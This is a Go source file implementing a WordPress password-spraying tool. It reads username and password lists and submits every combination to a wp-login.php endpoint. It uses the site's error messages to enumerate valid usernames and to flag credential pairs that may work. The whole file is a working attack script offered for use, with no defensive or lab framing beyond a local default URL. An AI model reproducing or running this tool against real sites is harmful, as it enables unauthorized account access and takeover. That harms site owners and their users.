// Wordpress password spraying with Golang

// Author: Iditabad
// Inspired by / translated from https://davidstorie.ca/creating-custom-password-spray-scripts-using-python3/

// What package is this?
package main

// What libs do we need?
import (
    "fmt"
    "io/ioutil"
// Need to do HTTP requests & URL Interaction
    "net/http"
    "net/url"
// Need to do strings-y shit
    "strings"
// Need flags for stuff and things
    "flag"
// File reading shit
    "bufio"
//    "log"
    "os"
)

// Formatting output happily
func keepLines(s string, n int) string {
    result := strings.Join(strings.Split(s, "\n")[:n], "\n")
    return strings.Replace(result, "\r", "", -1)
}

func readFile(fileName string) []string {
    // Open our files... be sad if error.
    file, err := os.Open(fileName)
    if err != nil {
        panic(err)
    }
    scanner := bufio.NewScanner(file)
    scanner.Split(bufio.ScanLines)
    var txtlines []string
    for scanner.Scan() {
        txtlines = append(txtlines, scanner.Text())
    }

    file.Close()
    return txtlines
}

// What are we doing? Oh yeah let's spray wordpress. 
func main() {
    urlPtr := flag.String("url", "http://wordpress.local/wp-login.php", "A URL to Log In.")
    usrPtr := flag.String("usernames", "usernames.list", "A list of users")
    pwdPtr := flag.String("passwords", "passwords.list", "A list of passwords")
    flag.Parse()
    var urlVar string = *urlPtr
    fmt.Println("URL: ", urlVar)
    fmt.Println("Username File:", *usrPtr)
    fmt.Println("Password File:", *pwdPtr)


    // Get usernames slice
    var usernames []string = readFile(*usrPtr)
    // Get passwords slice
    var passwords []string = readFile(*pwdPtr)

    // For each username grabbed from the usernames file...
    for _, username := range usernames {
        // Let us know what username we are on
        fmt.Println(username)
        // Then, for each password in the passwords file...
        for _, password := range passwords {
            // try to spray the thing.
            resp, err := http.PostForm(urlVar, url.Values{"log": {username}, "pwd": {password}})
            if err != nil {
                panic(err)
            }
            formbody, err := ioutil.ReadAll(resp.Body)
            var output string = keepLines(string(formbody), 30)
            defer resp.Body.Close()

            // If we got "Invalid Username" in the response, we are sad, and we will stop spraying that username.
            if strings.Contains(output, "Invalid username") {
                fmt.Printf("Username %s is INVALID -- BREAKING LOOP FOR USERNAME\n", username)
                break;
            } else {
                // If the username is good but password is bad, we will keep going.
                if strings.Contains(output, "The password you entered") {
                    fmt.Printf("%s:%s is INVALID\n", username, password)
                } else {
                // If the username and the password didn't error we may be in luck I guess?
                    fmt.Printf("%s:%s MAY BE VALID???\n", username, password)
                }
            }

            //fmt.Println(strings.Contains(output, "Invalid"))
            //fmt.Println(output)
        }
    }

}

